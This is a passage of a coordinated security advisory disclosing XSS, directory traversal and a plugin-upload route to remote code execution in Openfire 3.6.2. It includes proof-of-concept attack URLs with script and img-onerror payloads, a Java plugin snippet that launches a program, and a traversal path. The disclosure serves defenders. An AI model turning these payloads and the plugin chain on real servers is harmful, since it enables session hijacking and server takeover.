             Openfire multiple vulnerabilities



1. *Advisory Information*

Title: Openfire multiple vulnerabilities
Advisory ID: CORE-2008-1128
Advisory URL:
http://www.coresecurity.com/content/openfire-multiple-vulnerabilities
Date published: 2009-01-08
Date of last update: 2009-01-07
Vendors contacted: Jive Software
Release mode: Coordinated release


2. *Vulnerability Information*

Class: Cross site scripting (XSS)
Remotely Exploitable: Yes
Locally Exploitable: No
Bugtraq ID: 32935, 32937, 32938, 32939, 32940, 32943, 32944, 32945
CVE Name: N/A


3. *Vulnerability Description*

Openfire is a real time collaboration (RTC) server licensed under the
Open Source GPL. It uses the widely adopted open protocol for instant
messaging XMPP, also called Jabber. Multiple cross-site scripting
vulnerabilities have been found, which may lead to arbitrary remote code
execution on the server running the application due to unauthorized
upload of Java plugin code.


4. *Vulnerable packages*

   . Openfire 3.6.2


5. *Non-vulnerable packages*

   . Openfire 3.6.3


6. *Vendor Information, Solutions and Workarounds*

Openfire will release a fixed version through their community web site [1].


7. *Credits*

These vulnerabilities were discovered and researched by Federico Muttis,
from CORE IMPACT's Exploit Writing Team (EWT), Core Security Technologies.


8. *Technical Description / Proof of Concept Code*

Multiple cross-site scripting vulnerabilities have been found in
Openfire, which may lead to arbitrary remote code execution on the
server running Openfire server due to unauthorized upload of Java plugin
code.


8.1. *Reflected XSS Vulnerabilities*

Several cross site scripting (XSS) were detected that lead to cross site
request forgery (XSRF), which enable arbitrary remote code execution on
the server running the application. These vulnerabilities are network
exploitable but the victim must voluntarily interact with the attack
mechanism. The victim must be an authorized user to deploy the complete
attack.

We identified insufficient sanitization of several parameters in several
scripts. In the case of 'logviewer.jsp' (BID 32935), 'group-summary.jsp'
(BID 32937), 'user-properties.jsp' (BID 32938) and 'audit-policy.jsp'
(BID 32939) there is no sanitization at all. In 'log.jsp' (BID 32940)
there is a filter against '<script>', which is not enough, because
several other XSS vectors exist, like the one we show below.

Proof of Concept 'alert()' exploits follow.

[BID 32935] Insufficient sanitization in 'logviewer.jsp', parameter 'log':

/-----------

http://vulnsite.com/logviewer.jsp?clearLog=false&emailLog=false&lines=&log=%22/%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E%3C!--&markLog=false&mode=desc&refresh=&saveLog=false

- -----------/



[BID 32937] Insufficient sanitization in 'group-summary.jsp', parameter
'search':

/-----------

http://vulnsite.com/group-summary.jsp?search=%22%3E%3Cscript%3Ealert('xss')%3C/script%3E<!--

- -----------/



[BID 32938] Insufficient sanitization in 'user-properties.jsp',
parameter 'username':

/-----------

http://vulnsite.com/user-properties.jsp?username=%3Cscript%3Ealert(%27xss%27)%3C/script%3E

- -----------/



[BID 32939] Insufficient sanitization in 'audit-policy.jsp', the
vulnerable parameters are: 'logDir', 'logTimeout', 'maxDays',
'maxFileSize' and 'maxTotalSize'.

/-----------

http://vulnsite.com/audit-policy.jsp?maxTotalSize=%22%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E%3C!--&update=Save%20Settings

- -----------/



[BID 32940] Insufficient sanitization in 'log.jsp', '<script>' gets
filtered out but vectors like '<img>' still work:

/-----------

http://vulnsite.com/log.jsp?log=%3Cimg%20src=%27%27%20onerror=%27javascript:alert(%22xss%22)%27%3E

- -----------/




8.2. *Arbitrary Remote Code Execution*

Once the Openfire administrator's browser is executing arbitrary
Javascript and his/her session cookies have been stolen, it is trivial
to execute arbitrary code as there is no need to re-authenticate to
upload a new server plugin. Secure web applications generally
re-authenticate the administrator when performing such sensitive tasks.
In this case, however, you can simply upload a new plugin, without
re-authentication, with arbitrary Java code on the constructor. The
constructor will be called when the plugin is uploaded.

In order to create a potentially malicious plugin that executes
arbitrary Java code on the context of the server, you need to download
the Openfire source [2] and the apache ant tool [3]. Uncompress the
Openfire source and install the ant tool. You can modify any existing
plugin, add this code and call it from the constructor:

/-----------

public void start() {
  try {
    Runtime.getRuntime().exec("C:\\WINDOWS\\system32\\calc.exe");
  } catch (Exception ex) {
    ex.printStackTrace();
  }
}

- -----------/

 Then navigate to Openfire source 'build/' directory and execute 'ant
plugins', this will build all the plugins. You'll end up with a new file
'work/plugins/yourplugin.jar' which is now infected.


8.3. *Stored XSS Vulnerabilities*

[BID 32943] The page 'server-properties.jsp' displays the properties
without sanitization, an exploit triggered via a reflected XSS
vulnerability could add a new property with a name like
'"><script>alert(/xss/.source)</script>', which will be triggered every
time the administrator uses the 'server-properties.jsp' or
'security-audit-viewer.jsp'.

[BID 32944] The page 'muc-room-summary.jsp' displays properties edited
in 'muc-room-edit-form.jsp', for example, room name
'<script>alert('xss')</script>'.

These vulnerabilities can be used to ensure the persistence of any attack.


8.4. *Directory traversal*

[BID 32945] Insufficient validation in 'log.jsp' allows remote attackers
to read any .log file that the user running Openfire has access to. The
vulnerable code located in 'log.jsp' is the following:

/-----------

File logDir = new File(Log.getLogDirectory());
String filename = (new
StringBuilder()).append(log).append(".log").toString();
File logFile = new File(logDir, filename);

- -----------/



Proof of Concept:

/-----------

log.jsp?log=..\..\..\windows\debug\netsetup

- -----------/

 The string '.log' will be appended to the filename, so this attack only
works to read '.log' files,
